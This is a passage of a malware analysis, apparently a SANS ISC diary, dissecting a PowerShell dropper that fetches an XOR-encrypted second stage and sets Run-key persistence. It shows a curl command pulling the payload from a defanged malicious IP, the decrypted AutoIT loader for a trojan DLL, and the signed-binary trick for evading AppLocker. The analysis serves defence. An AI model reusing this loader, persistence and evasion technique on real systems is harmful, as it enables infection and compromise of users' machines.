<p>Let&#39;s have a look at the script.&nbsp;</p>

<p>A function gera-strrand() is created to generate random strings (lines 3-6)</p>

<p>The script verifies that it has not already infected the victim&#39;s computer by creating an empty file (line 1, 7-9). The command Set-Content acts like the &lsquo;touch&rsquo; UNIX command in this case.</p>

<p>A temporary random directory is created (line 10-12)</p>

<p>The second stage is downloaded&nbsp; (line 14-16) and stored in the newly created directory&nbsp;then XOR&rsquo;d with key 0x91 (line 17-22).</p>

<p>So, let&rsquo;s download and decrypt and see what&rsquo;s in the ZIP archive (SHA256:c2e7fa6a07045c0ded3ba5908ebd3a80f4176d2a2bf3d4654399d5bb3b2a0572):</p>

<pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;">
$ curl -s hxxp://200[.]98[.]170[.]29//uiferuisdfj/uj9o3fxnes.zip | ./xor.py
[&#39;q3w6vnrelzb2r0jay&#39;, &#39;JthRqcc3zk&#39;, &#39;bGOELsXU0h&#39;]</pre>

<p>Tip: I wrote the xor.py to decode and list the zip file content:</p>

<pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;">
#!/usr/bin/python3
import sys
import zipfile
import io
def xor(data):
    return bytearray((
        (data[i] ^ 0x91) for i in range(0,len(data))
    ))
d = sys.stdin.buffer.read()
zf = zipfile.ZipFile(io.BytesIO(xor(d)))
print(zf.namelist())</pre>

<p>Files are renamed with specific names. The technique used to rename files is to check their size because original filenames are probably randomly generated&nbsp;(line 29-50).</p>

<p>Finally, a registry key is created for persistence in HKCU:\Software\Microsoft\Windows\CurrentVersion\Run (line 51-53). The executed command has the following format:</p>

<pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;">
AutoIT.exe AutoITscript MaliciousDLL</pre>

<p>The PE32 file is indeed the legitimate AutoIT.exe launcher tool[1] that calls the script. It loads the malicious DLL. The script is protected (in .a3x format). It can be easily decrypted with a modified version of the myAuth2exe tool[<a href="https://github.com/dzzie/myaut_contrib">2</a>]. Here is the code:</p>

<pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;">
#NoTrayIcon
GLOBAL $MLOBBXOJ2=$CMDLINE[1]
GLOBAL $GTBP0WCI6JTPSMLAX16G=DLLOPEN($MLOBBXOJ2&amp;&quot;.dll&quot;)
DLLCALL($GTBP0WCI6JTPSMLAX16G,&quot;none&quot;,&quot;eKRZWJNbVUojH3qoQF3qjX&rdquo;)</pre>

<p>The script just loads the provided DLL file and invoke the exported function &lsquo;eKRZWJNbVUojH3qoQF3qjX&rsquo;. Here is the list of exports:</p>

<pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;">

 - 0x6277e0: &#39;eKRZWJNbVUojH3qoQF3qjX&#39; (4)</pre>

<p>The DLL was unknown on VT when I started to analyze this sample but it has now a score of 12/65 [<a href="https://www.virustotal.com/#/file/638848854dd2025263b0b4a8f9ddfec181aa901951cacf82355f78d9ebe63635/detection">3</a>]. It&#39;s a Trojan that has many features:</p>

<p><img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20180821-3.png" style="width: 250px; height: 815px;" /></p>

<p>The fact to use the AutoIT tool is a nice way to bypass many controls because the file is safe and signed. Often, tools like AppLocker allow the execution if properly signed executables.</p>

<p>Note that the dropper is not very stealthy because it simply reboots the computer once the persistence&nbsp;achieved (line 54)!</p>
